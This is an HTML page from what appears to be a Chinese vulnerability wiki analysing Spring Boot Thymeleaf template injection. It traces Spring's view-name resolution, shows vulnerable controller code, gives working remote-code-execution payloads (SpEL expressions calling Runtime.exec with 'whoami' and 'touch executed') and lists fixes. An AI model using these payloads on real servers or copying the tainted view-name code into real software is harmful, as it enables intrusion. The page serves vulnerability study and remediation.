@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Spring%20Boot/Spring%20Boot%20Thymeleaf%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Spring Boot Thymeleaf 模板注入 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Spring Boot Thymeleaf \u6a21\u677f\u6ce8\u5165", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "0x02 \u73af\u5883\u914d\u7f6e", url: "#0x02" },
+              {title: "0x03 \u6a21\u677f\u6ce8\u5165\u5206\u6790", url: "#0x03" },
+              {title: "0x04 \u4e0d\u5b89\u5168\u7684java\u4ee3\u7801", url: "#0x04-java" },
+              {title: "0x05 \u4fee\u590d\u65b9\u6848", url: "#0x05" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Spring%20Boot%20Tomcat%E5%AF%BC%E8%87%B4%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Spring%20Boot%20Tomcat%E5%AF%BC%E8%87%B4%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        Spring Boot Tomcat导致的JNDI注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Spring%20Boot%20Actuator%20jolokia%20%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84rce%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Spring%20Boot%20Actuator%20jolokia%20%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84rce%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Spring Boot Actuator jolokia 配置不当导致的rce漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="spring-boot-thymeleaf">Spring Boot Thymeleaf 模板注入<a class="headerlink" href="#spring-boot-thymeleaf" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Thymeleaf是用于Web和独立环境的现代服务器端Java模板引擎。类似与python
+web开发中的jinja模板引擎。顺便说一句，Thymeleaf是spring boot的推荐引擎</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="0x01">0x01 基础知识<a class="headerlink" href="#0x01" title="Permanent link">&para;</a></h3>
+<p>Spring Boot 本身就 Spring MVC 的简化版本。是在 Spring MVC
+的基础上实现了自动配置，简化了开发人员开发过程。Spring MVC 是通过一个叫
+DispatcherServlet 前端控制器的来拦截请求的。而在 Spring Boot 中
+使用自动配置把 DispatcherServlet 前端控制器自动配置到框架中。</p>
+<p>例如，我们来解析 /users 这个请求</p>
+<p><img alt="1.png" src="../resource/SpringBootThymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId25.png" /></p>
+<ol>
+<li>
+<p>DispatcherServlet 前端控制器拦截请求 /users</p>
+</li>
+<li>
+<p>servlet 决定使用哪个 handler 处理</p>
+</li>
+<li>
+<p>Spring 检测哪个控制器匹配 /users，Spring 从 \@RquestMapping
+    中查找出需要的信息</p>
+</li>
+<li>
+<p>Spring 找到正确的 Controller 方法后，开始执行 Controller 方法</p>
+</li>
+<li>
+<p>返回 users 对象列表</p>
+</li>
+<li>
+<p>根据与客户端交互需要返回 Json 或者 Xml 格式</p>
+</li>
+</ol>
+<h3 id="spring-boot">spring boot 相关注解<a class="headerlink" href="#spring-boot" title="Permanent link">&para;</a></h3>
+<ul>
+<li>\@Controller 处理 Http 请求</li>
+<li>\@RestController \@Controller 的衍生注解</li>
+<li>\@RequestMapping 路由请求 可以设置各种操作方法</li>
+<li>\@GetMapping GET 方法的路由</li>
+<li>\@PostMapping POST 方法的路由</li>
+<li>\@PutMapping PUT 方法的路由</li>
+<li>\@DeleteMapping DELETE 方法的路由</li>
+<li>\@PathVariable 处理请求 url 路径中的参数 /user/{id}</li>
+<li>\@RequestParam 处理问号后面的参数</li>
+<li>\@RequestBody 请求参数以json格式提交</li>
+<li>\@ResponseBody 返回 json 格式</li>
+</ul>
+<h3 id="controller">Controller注解<a class="headerlink" href="#controller" title="Permanent link">&para;</a></h3>
+<p>\@Controller 一般应用在有返回界面的应用场景下.例如，管理后台使用了
+thymeleaf 作为模板开发，需要从后台直接返回 Model
+对象到前台，那么这时候就需要使用 \@Controller 来注解。</p>
+<h3 id="requestmapping">RequestMapping注解<a class="headerlink" href="#requestmapping" title="Permanent link">&para;</a></h3>
+<p>用来将一个controller添加至路由中</p>
+<h2 id="0x02">0x02 环境配置<a class="headerlink" href="#0x02" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://github.com/veracode-research/spring-view-manipulation/">https://github.com/veracode-research/spring-view-manipulation/</a></p>
+</blockquote>
+<p>我们以spring boot + Thymeleaf模板创建一个带有漏洞的项目。核心代码如下</p>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nv">@GetMapping</span><span class="p">(</span><span class="ss">&quot;/path&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="k">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="k">path</span><span class="p">(</span><span class="nv">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">lang</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w">  </span><span class="n">lang</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="n">template</span><span class="w"> </span><span class="k">path</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">tainted</span>
+<span class="w">    </span><span class="err">}</span>
+</code></pre></div>
+
+<p>代码含义如下：用户请求的url为path，参数名称为lang，则服务器通过Thymeleaf模板，去查找相关的模板文件。</p>
+<p>例如，用户通过get请求<code>/path?lang=en</code>，则服务器去自动拼接待查找的模板文件名，为<code>resources/templates/en.html</code>，并返回给用户的浏览器。</p>
+<p>上面的代码存在两个问题：</p>
+<ol>
+<li>是不是存在任意文件读取？</li>
+<li>是不是存在诸如模板注入的漏洞？？？</li>
+</ol>
+<h2 id="0x03">0x03 模板注入分析<a class="headerlink" href="#0x03" title="Permanent link">&para;</a></h2>
+<p>spring boot如何查找controller这块我们不分析，因为对于我们不重要。</p>
+<p>spring
+boot在<code>org.springframework.web.servlet.ModelAndView</code>方法中，开始处理用户的请求</p>
+<div class="codehilite"><pre><span></span><code><span class="w"> </span><span class="cm">/**</span>
+<span class="cm">     * This implementation expects the handler to be an {@link HandlerMethod}.</span>
+<span class="cm">     */</span>
+<span class="w">    </span><span class="err">@</span><span class="nx">Override</span>
+<span class="w">    </span><span class="err">@</span><span class="nx">Nullable</span>
+<span class="w">    </span><span class="nx">public</span><span class="w"> </span><span class="k">final</span><span class="w"> </span><span class="nx">ModelAndView</span><span class="w"> </span><span class="nx">handle</span><span class="p">(</span><span class="nx">HttpServletRequest</span><span class="w"> </span><span class="nx">request</span><span class="p">,</span><span class="w"> </span><span class="nx">HttpServletResponse</span><span class="w"> </span><span class="nx">response</span><span class="p">,</span><span class="w"> </span><span class="nx">Object</span><span class="w"> </span><span class="nx">handler</span><span class="p">)</span>
+<span class="w">            </span><span class="nx">throws</span><span class="w"> </span><span class="nx">Exception</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">handleInternal</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span><span class="w"> </span><span class="nx">response</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">HandlerMethod</span><span class="p">)</span><span class="w"> </span><span class="nx">handler</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>随后在<code>org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle</code>方法中，通过invokeForRequest函数，根据用户提供的url，调用相关的controller，并将其返回值，作为待查找的模板文件名，通过Thymeleaf模板引擎去查找，并返回给用户</p>
+<div class="codehilite"><pre><span></span><code><span class="w"> </span><span class="cm">/**</span>
+<span class="cm">     * Invoke the method and handle the return value through one of the</span>
+<span class="cm">     * configured {@link HandlerMethodReturnValueHandler HandlerMethodReturnValueHandlers}.</span>
+<span class="cm">     * @param webRequest the current request</span>
+<span class="cm">     * @param mavContainer the ModelAndViewContainer for this request</span>
+<span class="cm">     * @param providedArgs &quot;given&quot; arguments matched by type (not resolved)</span>
+<span class="cm">     */</span>
+<span class="w">    </span><span class="nx">public</span><span class="w"> </span><span class="nx">void</span><span class="w"> </span><span class="nx">invokeAndHandle</span><span class="p">(</span><span class="nx">ServletWebRequest</span><span class="w"> </span><span class="nx">webRequest</span><span class="p">,</span><span class="w"> </span><span class="nx">ModelAndViewContainer</span><span class="w"> </span><span class="nx">mavContainer</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">Object</span><span class="o">...</span><span class="w"> </span><span class="nx">providedArgs</span><span class="p">)</span><span class="w"> </span><span class="nx">throws</span><span class="w"> </span><span class="nx">Exception</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">        </span><span class="nx">Object</span><span class="w"> </span><span class="nx">returnValue</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">invokeForRequest</span><span class="p">(</span><span class="nx">webRequest</span><span class="p">,</span><span class="w"> </span><span class="nx">mavContainer</span><span class="p">,</span><span class="w"> </span><span class="nx">providedArgs</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">setResponseStatus</span><span class="p">(</span><span class="nx">webRequest</span><span class="p">);</span>
+
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">returnValue</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">isRequestNotModified</span><span class="p">(</span><span class="nx">webRequest</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">getResponseStatus</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">mavContainer</span><span class="p">.</span><span class="nx">isRequestHandled</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nx">disableContentCachingIfNecessary</span><span class="p">(</span><span class="nx">webRequest</span><span class="p">);</span>
+<span class="w">                </span><span class="nx">mavContainer</span><span class="p">.</span><span class="nx">setRequestHandled</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+<span class="w">                </span><span class="k">return</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">StringUtils</span><span class="p">.</span><span class="nx">hasText</span><span class="p">(</span><span class="nx">getResponseStatusReason</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">mavContainer</span><span class="p">.</span><span class="nx">setRequestHandled</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+<span class="w">            </span><span class="k">return</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="nx">mavContainer</span><span class="p">.</span><span class="nx">setRequestHandled</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">this</span><span class="p">.</span><span class="nx">returnValueHandlers</span><span class="p">.</span><span class="nx">handleReturnValue</span><span class="p">(</span>
+<span class="w">                    </span><span class="nx">returnValue</span><span class="p">,</span><span class="w"> </span><span class="nx">getReturnValueType</span><span class="p">(</span><span class="nx">returnValue</span><span class="p">),</span><span class="w"> </span><span class="nx">mavContainer</span><span class="p">,</span><span class="w"> </span><span class="nx">webRequest</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>在函数中，调用<code>this.returnValueHandlers.handleReturnValue</code>去处理返回结果。最终在<code>org.springframework.web.servlet.mvc.method.annotation.ViewNameMethodReturnValueHandler#handleReturnValue</code>方法中，将controller返回值作为视图名称。代码如下</p>
+<div class="codehilite"><pre><span></span><code><span class="w"> </span><span class="nv">@Override</span>
+<span class="w">    </span><span class="k">public</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="n">handleReturnValue</span><span class="p">(</span><span class="nv">@Nullable</span><span class="w"> </span><span class="k">Object</span><span class="w"> </span><span class="n">returnValue</span><span class="p">,</span><span class="w"> </span><span class="n">MethodParameter</span><span class="w"> </span><span class="n">returnType</span><span class="p">,</span>
+<span class="w">            </span><span class="n">ModelAndViewContainer</span><span class="w"> </span><span class="n">mavContainer</span><span class="p">,</span><span class="w"> </span><span class="n">NativeWebRequest</span><span class="w"> </span><span class="n">webRequest</span><span class="p">)</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="k">Exception</span><span class="w"> </span><span class="err">{</span>
+
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">returnValue</span><span class="w"> </span><span class="n">instanceof</span><span class="w"> </span><span class="n">CharSequence</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">viewName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">returnValue</span><span class="p">.</span><span class="n">toString</span><span class="p">();</span>
+<span class="w">            </span><span class="n">mavContainer</span><span class="p">.</span><span class="n">setViewName</span><span class="p">(</span><span class="n">viewName</span><span class="p">);</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isRedirectViewName</span><span class="p">(</span><span class="n">viewName</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
+<span class="w">                </span><span class="n">mavContainer</span><span class="p">.</span><span class="n">setRedirectModelScenario</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="w">            </span><span class="err">}</span>
+<span class="w">        </span><span class="err">}</span>
+</code></pre></div>
+
+<p>spring
+boot最终在<code>org.springframework.web.servlet.DispatcherServlet#processDispatchResult</code>方法中，调用Thymeleaf模板引擎的表达式解析。将上一步设置的视图名称为解析为模板名称，并加载模板，返回给用户。核心代码如下<code>org.thymeleaf.standard.expression.IStandardExpressionParser#parseExpression</code></p>
+<div class="codehilite"><pre><span></span><code><span class="w">        </span><span class="nt">final</span><span class="w"> </span><span class="nt">String</span><span class="w"> </span><span class="nt">viewTemplateName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">getTemplateName</span><span class="o">();</span>
+<span class="w">        </span><span class="nt">final</span><span class="w"> </span><span class="nt">ISpringTemplateEngine</span><span class="w"> </span><span class="nt">viewTemplateEngine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">getTemplateEngine</span><span class="o">();</span>
+
+
+<span class="w">        </span><span class="nt">final</span><span class="w"> </span><span class="nt">IStandardExpressionParser</span><span class="w"> </span><span class="nt">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">StandardExpressions</span><span class="p">.</span><span class="nc">getExpressionParser</span><span class="o">(</span><span class="nt">configuration</span><span class="o">);</span>
+
+<span class="w">        </span><span class="nt">final</span><span class="w"> </span><span class="nt">FragmentExpression</span><span class="w"> </span><span class="nt">fragmentExpression</span><span class="o">;</span>
+<span class="w">        </span><span class="nt">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="err">//</span><span class="w"> </span><span class="err">By</span><span class="w"> </span><span class="err">parsing</span><span class="w"> </span><span class="err">it</span><span class="w"> </span><span class="err">as</span><span class="w"> </span><span class="err">a</span><span class="w"> </span><span class="err">standard</span><span class="w"> </span><span class="err">expression,</span><span class="w"> </span><span class="err">we</span><span class="w"> </span><span class="err">might</span><span class="w"> </span><span class="err">profit</span><span class="w"> </span><span class="err">from</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">expression</span><span class="w"> </span><span class="err">cache</span>
+<span class="w">            </span><span class="err">fragmentExpression</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">(FragmentExpression)</span><span class="w"> </span><span class="err">parser.parseExpression(context,</span><span class="w"> </span><span class="err">&quot;~{&quot;</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">viewTemplateName</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="err">&quot;</span><span class="p">}</span><span class="s2">&quot;);</span>
+<span class="s2">        } catch (final TemplateProcessingException e) {</span>
+<span class="s2">            throw new IllegalArgumentException(&quot;</span><span class="nt">Invalid</span><span class="w"> </span><span class="nt">template</span><span class="w"> </span><span class="nt">name</span><span class="w"> </span><span class="nt">specification</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;&quot; + viewTemplateName + &quot;&#39;</span><span class="err">&quot;</span><span class="o">);</span>
+<span class="w">        </span><span class="err">}</span>
+</code></pre></div>
+
+<h2 id="0x04-java">0x04 不安全的java代码<a class="headerlink" href="#0x04-java" title="Permanent link">&para;</a></h2>
+<h4 id="_4">第一种：<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nv">@GetMapping</span><span class="p">(</span><span class="ss">&quot;/path&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="k">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="k">path</span><span class="p">(</span><span class="nv">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">lang</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w">  </span><span class="n">lang</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="n">template</span><span class="w"> </span><span class="k">path</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">tainted</span>
+<span class="w">    </span><span class="err">}</span>
+</code></pre></div>
+
+<p>在查找模板中，引用了用户输入的内容</p>
+<p>payload</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org:8090</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+</code></pre></div>
+
+<p><img alt="2.png" src="../resource/SpringBootThymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/media/rId33.png" /></p>
+<h4 id="_5">第二种<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<p>根据spring
+boot定义，如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析。</p>
+<blockquote>
+<p><a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html">https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html</a>#mvc-ann-return-types</p>
+</blockquote>
+<p>在这种情况下，我们只要可以控制请求的controller的参数，一样可以造成RCE漏洞。例如我们可以控制document参数</p>
+<div class="codehilite"><pre><span></span><code>@GetMapping(&quot;/doc/{document}&quot;)
+public<span class="w"> </span>void<span class="w"> </span>getDocument(@PathVariable<span class="w"> </span>String<span class="w"> </span>document)<span class="w"> </span>{
+<span class="w">    </span>log.info(&quot;Retrieving<span class="w"> </span>&quot;<span class="w"> </span>+<span class="w"> </span>document);
+}
+GET<span class="w"> </span>/doc/__<span class="cp">${</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Runtime</span><span class="p">)</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s2">&quot;touch executed&quot;</span><span class="p">)</span><span class="cp">}</span>__::.x
+</code></pre></div>
+
+<h2 id="0x05">0x05 修复方案<a class="headerlink" href="#0x05" title="Permanent link">&para;</a></h2>
+<h3 id="1-responsebody">1. 设置ResponseBody注解<a class="headerlink" href="#1-responsebody" title="Permanent link">&para;</a></h3>
+<p>如果设置<code>ResponseBody</code>，则不再调用模板解析</p>
+<h3 id="2-redirect">2. 设置redirect重定向<a class="headerlink" href="#2-redirect" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="nv">@GetMapping</span><span class="p">(</span><span class="ss">&quot;/safe/redirect&quot;</span><span class="p">)</span>
+<span class="k">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">redirect</span><span class="p">(</span><span class="nv">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="ss">&quot;redirect:&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">url</span><span class="p">;</span><span class="w"> </span><span class="o">//</span><span class="n">CWE</span><span class="o">-</span><span class="mi">601</span><span class="p">,</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">hostname</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">redirect</span>
+</code></pre></div>
+
+<p>根据spring
+boot定义，如果名称以<code>redirect:</code>开头，则不再调用<code>ThymeleafView</code>解析，调用<code>RedirectView</code>去解析<code>controller</code>的返回值</p>
+<h3 id="3-response">3. response<a class="headerlink" href="#3-response" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="nv">@GetMapping</span><span class="p">(</span><span class="ss">&quot;/safe/doc/{document}&quot;</span><span class="p">)</span>
+<span class="k">public</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="n">getDocument</span><span class="p">(</span><span class="nv">@PathVariable</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">    </span><span class="nf">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="ss">&quot;Retrieving &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">document</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="n">FP</span>
+<span class="err">}</span>
+</code></pre></div>
+
+<p>由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP
+Response，因此不会发生视图名称解析</p>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://www.cnblogs.com/potatsoSec/p/13620019.html">https://www.cnblogs.com/potatsoSec/p/13620019.html</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Spring%20Boot%20Tomcat%E5%AF%BC%E8%87%B4%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Spring%20Boot%20Tomcat%E5%AF%BC%E8%87%B4%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        Spring Boot Tomcat导致的JNDI注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Spring%20Boot%20Actuator%20jolokia%20%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84rce%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Spring%20Boot%20Actuator%20jolokia%20%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84rce%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Spring Boot Actuator jolokia 配置不当导致的rce漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
